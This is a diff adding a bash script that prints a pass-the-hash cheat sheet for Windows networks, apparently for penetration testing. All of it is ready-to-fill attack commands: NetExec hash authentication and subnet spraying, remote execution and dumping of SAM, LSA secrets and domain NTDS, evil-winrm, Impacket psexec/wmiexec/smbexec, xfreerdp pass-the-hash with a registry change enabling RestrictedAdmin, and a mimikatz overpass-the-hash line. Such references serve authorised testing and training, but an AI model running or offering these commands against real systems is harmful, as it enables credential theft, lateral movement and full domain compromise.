@@ -1,0 +1,52 @@
+#!/bin/bash
+BOLD='\033[1m'
+CYAN='\033[36m'
+GREEN='\033[32m'
+YELLOW='\033[33m'
+BLUE='\033[34m'
+NC='\033[0m'
+
+printf "\n"
+echo -e "${BOLD}${YELLOW}── PASS-THE-HASH ─────────────────────────────────────${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── nxc — All Protocols ──────────────────────────────${NC}"
+echo -e "  ${GREEN}nxc smb   <TARGET> -u <USER> -H '<NTLM>' --local-auth${NC}    # SMB"
+echo -e "  ${GREEN}nxc winrm <TARGET> -u <USER> -H '<NTLM>' --local-auth${NC}    # WinRM"
+echo -e "  ${GREEN}nxc rdp   <TARGET> -u <USER> -H '<NTLM>' --local-auth${NC}    # RDP"
+echo -e "  ${GREEN}nxc mssql <TARGET> -u <USER> -H '<NTLM>' --local-auth${NC}    # MSSQL"
+echo -e "  ${GREEN}nxc smb   192.168.1.0/24 -u administrator -H '<HASH>' --local-auth${NC}  # subnet spray"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── nxc — Exec + Dump after PTH ──────────────────────${NC}"
+echo -e "  ${GREEN}nxc smb <TARGET> -u administrator -H '<hash>' --local-auth -x 'whoami'${NC}"
+echo -e "  ${GREEN}nxc smb <TARGET> -u administrator -H '<hash>' --local-auth --sam${NC}"
+echo -e "  ${GREEN}nxc smb <TARGET> -u administrator -H '<hash>' --local-auth --lsa${NC}"
+echo -e "  ${GREEN}nxc smb <DC_IP>  -u administrator -H '<hash>' --ntds${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── evil-winrm ───────────────────────────────────────${NC}"
+echo -e "  ${GREEN}evil-winrm -i <IP> -u <USER> -H <NTLM>${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Impacket Tools ───────────────────────────────────${NC}"
+echo -e "  ${GREEN}impacket-psexec -hashes :<NTLM> Administrator@<TARGET>${NC}   # SMB exec"
+echo -e "  ${GREEN}impacket-wmiexec -hashes :<NTLM> Administrator@<TARGET>${NC}  # WMI (no drop)"
+echo -e "  ${GREEN}impacket-smbexec -hashes :<NTLM> Administrator@<TARGET>${NC}  # SMB no binary"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── xfreerdp — RDP PTH (Restricted Admin Mode) ───────${NC}"
+echo -e "  ${GREEN}xfreerdp /u:<USER> /pth:<NTLM> /v:<TARGET> /cert-ignore${NC}"
+printf "\n"
+echo -e "  Note: Requires RestrictedAdmin enabled on target:"
+echo -e "  ${GREEN}reg add \"HKLM\\System\\CurrentControlSet\\Control\\Lsa\" /v DisableRestrictedAdmin /t REG_DWORD /d 0${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Overpass-the-Hash (NTLM -> Kerberos TGT) ────────${NC}"
+echo -e "  ${GREEN}sekurlsa::pth /user:Administrator /domain:corp.com /ntlm:<NTLM> /run:powershell.exe${NC}"
+printf "\n"
+echo -e "  Note: Spawned PS process runs as target user — use klist / Enter-PSSession / net use"
+printf "\n"
+
+printf "\n"
+echo -e "${YELLOW}─────────────────────────────────────────────────────${NC}"
